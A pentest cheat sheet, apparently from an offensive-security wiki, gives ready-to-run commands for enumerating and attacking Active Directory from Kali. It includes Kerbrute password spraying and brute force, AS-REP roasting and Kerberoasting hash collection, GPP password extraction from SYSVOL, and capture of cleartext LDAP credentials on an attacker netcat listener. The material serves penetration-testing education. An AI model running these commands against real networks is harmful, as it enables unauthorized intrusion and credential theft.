---
title: "Enumeration & Discovery — From Kali"
description: "Comprehensive Active Directory enumeration from a Kali/Linux attacker host: port scanning, DNS, LDAP, BloodHound, Kerbrute, NetExec, rpcclient, windapsearch, and more."
weight: 1
tags: ["active-directory", "enumeration", "kali", "ldap", "bloodhound", "kerbrute", "nxc", "impacket"]
---

## Quick Reference

| Technique | Tool | Requires Creds |
|---|---|---|
| AD port scan | nmap | No |
| DNS SRV enumeration | dig / nslookup | No |
| LDAP anonymous bind | ldapsearch | No |
| Full LDAP dump | ldapdomaindump | No / Yes |
| SMB/User enumeration | enum4linux-ng | No / Yes |
| AD enumeration swiss-knife | NetExec (nxc) | No / Yes |
| Attack path mapping | bloodhound-python | Yes |
| Kerberos user enum | Kerbrute | No |
| User / SID enumeration | lookupsid.py, GetADUsers.py | No / Yes |
| RPC enumeration | rpcclient | No / Yes |
| LDAP attribute queries | windapsearch | Yes |
| Share content discovery | nxc spider_plus | Yes |
| adminCount / SPN / UAC flags | ldapsearch | Yes |

---

## Environment Setup

Before attacking an AD environment from Kali, configure your local resolver and Kerberos client so tools resolve domain names correctly.

### /etc/hosts

```bash
echo "DC_IP  DC_HOSTNAME.TARGET_DOMAIN DC_HOSTNAME TARGET_DOMAIN" | sudo tee -a /etc/hosts
# Example structure (use your actual values):
# 10.10.10.10  dc01.corp.local corp.local dc01
```

### /etc/krb5.conf

```ini
[libdefaults]
    default_realm = TARGET_DOMAIN_UPPER
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    TARGET_DOMAIN_UPPER = {
        kdc = DC_HOSTNAME.TARGET_DOMAIN
        admin_server = DC_HOSTNAME.TARGET_DOMAIN
    }

[domain_realm]
    .TARGET_DOMAIN = TARGET_DOMAIN_UPPER
    TARGET_DOMAIN  = TARGET_DOMAIN_UPPER
```

> **Note:** `TARGET_DOMAIN_UPPER` is the domain in all-caps (e.g. `CORP.LOCAL`). Kerberos realms are case-sensitive.

---

## Port Scanning — Identifying AD Infrastructure

Scan for the standard Active Directory service ports to identify domain controllers and supporting services.

```bash
sudo nmap -sV -Pn -p 88,135,139,389,445,464,593,636,3268,3269,5985,9389 TARGET_IP -oN ad_ports.txt
```

Key ports and their meaning:

| Port | Service | Notes |
|---|---|---|
| 88/tcp | Kerberos | KDC — confirms DC |
| 389/tcp | LDAP | Directory service |
| 636/tcp | LDAPS | LDAP over TLS |
| 3268/tcp | Global Catalog LDAP | Forest-wide queries |
| 3269/tcp | Global Catalog LDAPS | GC over TLS |
| 445/tcp | SMB | File shares, SAMR, RPC over SMB |
| 135/tcp | RPC Endpoint Mapper | MS-RPC |
| 593/tcp | RPC over HTTP | Often on DCs |
| 464/tcp | Kpasswd | Kerberos password change |
| 5985/tcp | WinRM HTTP | PowerShell remoting |
| 9389/tcp | AD Web Services | ADWS |

Full subnet scan to map all DCs and member servers:

```bash
sudo nmap -sV -Pn -p 88,389,445,636,3268 10.10.10.0/24 --open -oN dc_discovery.txt
```

---

## DNS Enumeration

DNS holds a wealth of AD topology information. SRV records identify DCs, GC servers, and Kerberos infrastructure.

### SRV Record Queries

```bash
# Identify all LDAP-capable DCs
dig @DC_IP _ldap._tcp.dc._msdcs.TARGET_DOMAIN SRV

# Identify Kerberos KDCs
dig @DC_IP _kerberos._tcp.dc._msdcs.TARGET_DOMAIN SRV

# Identify Global Catalog servers
dig @DC_IP _gc._tcp.TARGET_DOMAIN SRV

# PDC Emulator
dig @DC_IP _ldap._tcp.pdc._msdcs.TARGET_DOMAIN SRV

# All DCs in the domain
dig @DC_IP _ldap._tcp.TARGET_DOMAIN SRV

# Enumerate child domains (if forest)
dig @DC_IP _msdcs.TARGET_DOMAIN NS
```

Expected SRV output example:

```
_ldap._tcp.dc._msdcs.corp.local. 600 IN SRV 0 100 389 dc01.corp.local.
```

### nslookup

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.TARGET_DOMAIN DC_IP
nslookup -type=NS TARGET_DOMAIN DC_IP
nslookup -type=MX TARGET_DOMAIN DC_IP
```

### Zone Transfer Attempt

```bash
dig axfr TARGET_DOMAIN @DC_IP
```

> **Note:** Zone transfers are rarely allowed from external hosts in modern AD environments. A successful zone transfer reveals all DNS records including internal hostnames and IPs.

---

## LDAP Anonymous Bind Check

Before using credentials, test whether the DC allows anonymous LDAP bind (misconfiguration).

```bash
# Check anonymous bind — returns base DN info if enabled
ldapsearch -x -H ldap://DC_IP -b '' -s base '(objectclass=*)' namingContexts

# Attempt anonymous enumeration of all objects
ldapsearch -x -H ldap://DC_IP -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" -s sub "(objectclass=*)" | head -100
```

### LDAP Enumeration with Credentials

```bash
# Bind with username and password
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(objectClass=user)" sAMAccountName userPrincipalName memberOf

# Enumerate all domain users
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail pwdLastSet accountExpires userAccountControl

# Enumerate groups
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(objectClass=group)" cn member

# Enumerate computers
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" \
  -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(objectClass=computer)" dNSHostName operatingSystem
```

### Key LDAP Attribute Queries

```bash
# Users with adminCount=1 (protected by AdminSDHolder)
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Users with SPN set (Kerberoasting candidates)
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Accounts with DONT_REQUIRE_PREAUTH (AS-REP roasting candidates)
# userAccountControl flag 4194304 = DONT_REQ_PREAUTH
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Accounts with password not required
# userAccountControl flag 32 = PASSWD_NOTREQD
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName

# Unconstrained delegation computers (UAC flag 524288)
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName

# Trust objects
ldapsearch -x -H ldap://DC_IP \
  -D "USERNAME@TARGET_DOMAIN" -w "PASSWORD" \
  -b "CN=System,DC=TARGET_DOMAIN_PART1,DC=TARGET_DOMAIN_PART2" \
  "(objectClass=trustedDomain)" trustPartner trustDirection trustAttributes
```

---

## ldapdomaindump

`ldapdomaindump` produces JSON and HTML output of the full AD structure — users, groups, computers, policies, trusts.

```bash
# Without credentials (anonymous bind)
ldapdomaindump ldap://DC_IP -o /tmp/ldd_output/

# With credentials
ldapdomaindump -u "TARGET_DOMAIN\\USERNAME" -p "PASSWORD" DC_IP -o /tmp/ldd_output/

# With LDAPS
ldapdomaindump -u "TARGET_DOMAIN\\USERNAME" -p "PASSWORD" ldaps://DC_IP -o /tmp/ldd_output/ --no-json --no-grep
```

Output files of interest:

```
domain_users.html       — all users with attributes
domain_groups.html      — groups and memberships
domain_computers.html   — computers, OS versions
domain_trusts.html      — trust relationships
domain_policy.html      — password / lockout policy
```

---

## enum4linux-ng

`enum4linux-ng` is a rewrite of enum4linux with improved output and Python3 support. It wraps ldap, smb, and rpc calls.

```bash
# Full enumeration without credentials
enum4linux-ng -A DC_IP

# Full enumeration with credentials
enum4linux-ng -A -u USERNAME -p PASSWORD DC_IP

# Export results
enum4linux-ng -A -u USERNAME -p PASSWORD DC_IP -oA /tmp/enum4linux_output

# Specific modules: -U users, -G groups, -S shares, -P password policy, -R rid brute
enum4linux-ng -U -G -S DC_IP
```

Sample output excerpt:

```
[+] Domain: TARGET_DOMAIN
[+] Users found via RPC:
username: USERNAME  rid: 1000
[+] Groups found via RPC:
groupname: Domain Admins  gid: 512
```

---

## NetExec (nxc)

NetExec (successor to CrackMapExec) is the primary Swiss-army knife for AD enumeration and exploitation.

### SMB Enumeration

```bash
# Null session probe
nxc smb DC_IP -u '' -p ''
nxc smb DC_IP -u 'a' -p ''

# Host and domain info
nxc smb DC_IP -u USERNAME -p PASSWORD

# User enumeration
nxc smb DC_IP -u USERNAME -p PASSWORD --users

# Group enumeration
nxc smb DC_IP -u USERNAME -p PASSWORD --groups

# Local group enumeration
nxc smb DC_IP -u USERNAME -p PASSWORD --local-groups

# Share enumeration
nxc smb DC_IP -u USERNAME -p PASSWORD --shares

# Logged-on users
nxc smb DC_IP -u USERNAME -p PASSWORD --loggedon-users

# Active sessions
nxc smb DC_IP -u USERNAME -p PASSWORD --sessions

# Password policy
nxc smb DC_IP -u USERNAME -p PASSWORD --pass-pol

# RID bruteforce for user enumeration
nxc smb DC_IP -u USERNAME -p PASSWORD --rid-brute

# Generate relay target list (hosts without SMB signing)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# All at once
nxc smb DC_IP -u USERNAME -p PASSWORD --groups --local-groups --loggedon-users \
  --rid-brute --sessions --users --shares --pass-pol
```

### LDAP Enumeration

```bash
# Basic LDAP connection test
nxc ldap DC_IP -u USERNAME -p PASSWORD

# Enumerate users via LDAP
nxc ldap DC_IP -u USERNAME -p PASSWORD --users

# Enumerate groups
nxc ldap DC_IP -u USERNAME -p PASSWORD --groups

# Computers
nxc ldap DC_IP -u USERNAME -p PASSWORD --computers

# Privileged users (adminCount=1)
nxc ldap DC_IP -u USERNAME -p PASSWORD --admin-count

# Accounts with unconstrained delegation
nxc ldap DC_IP -u USERNAME -p PASSWORD --trusted-for-delegation

# Accounts not requiring a password
nxc ldap DC_IP -u USERNAME -p PASSWORD --password-not-required

# ASREPRoast via LDAP
nxc ldap DC_IP -u USERNAME -p PASSWORD --asreproast asrep_hashes.txt
nxc ldap DC_IP -u users.txt -p '' --asreproast asrep_hashes.txt

# Kerberoast via LDAP
nxc ldap DC_IP -u USERNAME -p PASSWORD --kerberoasting kerb_hashes.txt

# Enumerate trusted domains
nxc ldap DC_IP -u USERNAME -p PASSWORD --trusted-for-delegation
```

### Share Content Discovery (spider_plus)

```bash
# Spider all accessible shares for interesting files
nxc smb DC_IP -u USERNAME -p PASSWORD -M spider_plus

# Spider with output to file
nxc smb DC_IP -u USERNAME -p PASSWORD -M spider_plus -o OUTPUT=/tmp/spider_output

# Check specific share
nxc smb DC_IP -u USERNAME -p PASSWORD --shares -M spider_plus
```

---

## BloodHound Python

`bloodhound-python` collects AD data remotely and outputs JSON files for import into BloodHound for attack path analysis.

```bash
# Full collection
bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -c All

# Full collection with zip output
bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -c All --zip

# Collection including trust relationships
bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -c All,Trusts

# Targeted collection — only sessions (faster, less noisy)
bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -c Session

# Collection types available: All, DCOnly, Group, LocalAdmin, RDP, DCOM, PSRemote, Trusts, LoggedOn, Session, ObjectProps, ACL, Container, Default

# With Kerberos ticket
export KRB5CCNAME=/tmp/USERNAME.ccache
bloodhound-python -u USERNAME -k -no-pass -ns DC_IP -d TARGET_DOMAIN -c All

# Via SOCKS proxy
proxychains bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -c All

# With specific DC
bloodhound-python -u USERNAME -p PASSWORD -ns DC_IP -d TARGET_DOMAIN -dc DC_HOSTNAME.TARGET_DOMAIN -c All
```

Import the resulting JSON files into the BloodHound GUI and use pre-built queries:

- "Find all Domain Admins"
- "Shortest Path to Domain Admins"
- "Find Principals with DCSync Rights"
- "Computers with Unconstrained Delegation"

---

## Kerbrute

`kerbrute` performs Kerberos-based user enumeration and password spraying without touching LDAP or SMB — stealthier and does not require credentials for user enumeration.

```bash
# User enumeration (sends AS-REQ per username, looks for valid pre-auth errors)
kerbrute userenum -d TARGET_DOMAIN --dc DC_IP usernames.txt -o valid_users.txt

# Password spray (single password against all users — mind lockout policy)
kerbrute passwordspray -d TARGET_DOMAIN --dc DC_IP valid_users.txt PASSWORD

# Brute force single user
kerbrute bruteuser -d TARGET_DOMAIN --dc DC_IP passwords.txt USERNAME

# Credential stuffing from file (user:pass per line)
kerbrute bruteforce -d TARGET_DOMAIN --dc DC_IP credentials.txt
```

> **Note:** Kerbrute user enumeration generates Kerberos AS-REQ events (Event ID 4768). Password spray generates 4771 (pre-auth failure). These are logged but are less noisy than LDAP/SMB auth attempts. Always check the domain password lockout policy before spraying.

---

## Impacket — GetADUsers and lookupsid

### GetADUsers.py

```bash
# Enumerate all domain users
GetADUsers.py -all TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP

# Without password (will prompt)
GetADUsers.py -all TARGET_DOMAIN/USERNAME -dc-ip DC_IP

# Output to file
GetADUsers.py -all TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP > ad_users.txt
```

### lookupsid.py — SID Enumeration

`lookupsid.py` brute-forces RIDs over RPC to enumerate users, groups, and aliases including the domain SID.

```bash
# Enumerate with credentials
lookupsid.py TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP

# With NTLM hash
lookupsid.py -hashes :HASH TARGET_DOMAIN/USERNAME@DC_IP

# Null session (if allowed)
lookupsid.py anonymous@DC_IP

# Limit RID range
lookupsid.py TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP 5000
```

Sample output:

```
[*] Brute forcing SIDs at DC_IP
[*] StringBinding ncacn_np:DC_IP[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
500: TARGET_DOMAIN\Administrator (SidTypeUser)
501: TARGET_DOMAIN\Guest (SidTypeUser)
512: TARGET_DOMAIN\Domain Admins (SidTypeGroup)
513: TARGET_DOMAIN\Domain Users (SidTypeGroup)
```

---

## rpcclient

`rpcclient` provides interactive and scriptable RPC enumeration over SMB.

```bash
# Connect with credentials
rpcclient -U "USERNAME%PASSWORD" DC_IP

# Null session
rpcclient -U "" -N DC_IP

# Run single command
rpcclient -U "USERNAME%PASSWORD" DC_IP -c "enumdomusers"
```

Useful commands inside rpcclient:

```bash
# Enumerate domain users
enumdomusers

# Enumerate domain groups
enumdomgroups

# Enumerate domain aliases (local groups)
enumalsgroups domain
enumalsgroups builtin

# Query specific user by RID
queryuser 0x1f4

# Query specific group by RID
querygroup 0x200

# Enumerate group members
querygroupmem 0x200

# Get domain password policy
querydominfo

# Enumerate shares
netshareenum
netshareenumall

# Enumerate trust relationships
dsenumdomtrusts

# Get DC info
dsgetdcname TARGET_DOMAIN

# Look up a username
lookupnames USERNAME

# Look up a SID
lookupsids DOMAIN_SID-RID
```

One-liner to dump all users and their RIDs:

```bash
rpcclient -U "USERNAME%PASSWORD" DC_IP -c "enumdomusers" | \
  grep -oP '\[.*?\]' | tr -d '[]' | \
  while read user; do
    rpcclient -U "USERNAME%PASSWORD" DC_IP -c "queryuser $user" 2>/dev/null
  done
```

---

## windapsearch

`windapsearch` is a Python3 LDAP enumeration tool with pre-built AD-focused queries.

```bash
# Enumerate users
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD -U

# Enumerate computers
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD -C

# Enumerate groups
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD -G

# Enumerate privileged users (Domain Admins, Enterprise Admins, etc.)
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD --da

# Enumerate members of specific group
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD -m "Remote Desktop Users"

# Enumerate GPOs
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD --gpos

# Full enumeration with all flags
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD -U -G -C --da -m "Remote Desktop Users"

# Enumerate custom LDAP filter
python3 windapsearch.py --dc-ip DC_IP -u "TARGET_DOMAIN\\USERNAME" -p PASSWORD \
  --custom "(&(objectClass=user)(adminCount=1))"
```

---

## LDAP Credential Sniffing

Some applications (printers, scanners, web consoles) store LDAP credentials and expose a "test connection" button. By redirecting the LDAP server to your listener, you can capture credentials in cleartext.

```bash
# Start netcat listener on LDAP port
sudo nc -nlvp 389

# In the target application's admin console:
# Change LDAP server IP to YOUR_ATTACKER_IP
# Click "Test Connection"
# Credentials will appear in cleartext on your listener
```

> **Note:** This is a low-noise technique that does not require any active injection. It works on printers, Confluence, Jenkins, and many other enterprise products that store LDAP bind credentials.

---

## GPP Passwords in SYSVOL

Group Policy Preferences (GPP) used to store credentials in SYSVOL in an encrypted but reversible format. The AES key was published by Microsoft.

```bash
# Check SYSVOL for GPP passwords
nxc smb DC_IP -u USERNAME -p PASSWORD -M gpp_password

# Impacket Get-GPPPassword
Get-GPPPassword.py "TARGET_DOMAIN/USERNAME:PASSWORD@DC_HOSTNAME.TARGET_DOMAIN" -dc-ip DC_IP

# Manual: mount SYSVOL and search for cpassword fields
smbclient //DC_IP/SYSVOL -U "TARGET_DOMAIN/USERNAME%PASSWORD"
# Inside smbclient:
recurse ON
prompt OFF
mget *

# Search downloaded files for cpassword
grep -r "cpassword" /tmp/sysvol_dump/

# Decrypt found cpassword value
gpp-decrypt CPASSWORD_HASH
```

---

## Recommended Enumeration Order

When approaching a new AD environment from Kali, follow this workflow:

```
1. Scan for AD ports → nmap -p 88,389,445,636,3268 SUBNET/24
2. DNS enumeration → dig SRV records to find all DCs
3. Configure /etc/hosts and krb5.conf
4. Check LDAP anonymous bind → ldapsearch anonymous
5. SMB null session → nxc smb DC_IP -u '' -p ''
6. Enumerate users without creds → kerbrute userenum
7. Once credentials obtained:
   a. ldapdomaindump for full AD dump
   b. bloodhound-python -c All for attack path analysis
   c. nxc ldap for adminCount, delegation, asreproast targets
   d. GetUserSPNs.py for Kerberoasting targets
   e. findDelegation.py for delegation attack surface
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
